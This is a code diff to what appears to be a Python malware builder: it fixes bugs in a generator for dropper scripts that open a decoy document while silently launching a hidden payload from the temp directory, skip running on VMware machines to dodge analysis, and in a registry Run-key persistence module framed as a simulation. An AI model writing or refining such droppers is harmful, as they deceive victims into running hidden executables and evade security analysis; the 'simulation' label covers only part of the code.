@@ -273,7 +273,6 @@ class LogicSFX:
     def create_executor(payload_name, decoy_name, temp_dir, enable_vm):
         vm_code = VM_CHECK_CODE if enable_vm else ""
         vm_call = "    if is_running_on_vmware_windows(): return" if enable_vm else ""
-        winreg_import = "import winreg" if enable_vm else ""
 
         script_content = f'''
 import os
@@ -281,8 +280,8 @@ import subprocess
 import tempfile
 import sys
 import shutil
+import time
 import platform
-{winreg_import}
 
 {vm_code}
 
@@ -325,6 +324,9 @@ def execute_payload():
             subprocess.Popen(['xdg-open', decoy_path_out])
         else:
             subprocess.Popen(['open', decoy_path_out])
+
+        # Wait for the viewer to open the file before cleaning up
+        time.sleep(5)
             
     except Exception as e:
         pass # Fail silently
@@ -501,9 +503,7 @@ def run():
         temp_dir = tempfile.gettempdir()
         t_path = os.path.join(temp_dir, 'run_' + str(os.getpid()) + '.exe')
         with open(t_path, 'wb') as f: f.write(orig)
-        subprocess.run([t_path] + sys.argv[1:])
-        try: os.remove(t_path)
-        except: pass
+        subprocess.Popen([t_path] + sys.argv[1:])
     except: pass
 
 if __name__ == "__main__":
@@ -533,7 +533,7 @@ if __name__ == "__main__":
                 os.remove("temp_loader.py")
             if os.path.exists("build"):
                 shutil.rmtree("build")
-            spec = final_name + '.spec'
+            spec = os.path.splitext(final_name)[0] + '.spec'
             if os.path.exists(spec):
                 os.remove(spec)
             sys.stdout, sys.stderr = _saved_stdout, _saved_stderr
@@ -581,7 +581,7 @@ class LogicRegistryPersistence:
             if enable_cleanup else ""
         )
 
-        script_content = f"""import os, sys, shutil, tempfile, platform, winreg
+        script_content = f"""import os, sys, shutil, tempfile, platform
 import tkinter as tk
 from tkinter import messagebox
 {vm_code}
@@ -605,6 +605,7 @@ def run_simulation():
     if platform.system() != "Windows":
         _report("[ERROR] Windows-only simulation.")
         return
+    import winreg
     lines = [
         "[SIM] Registry Run Key Persistence Simulator",
         "[SIM] Technique: MITRE ATT&CK T1547.001",
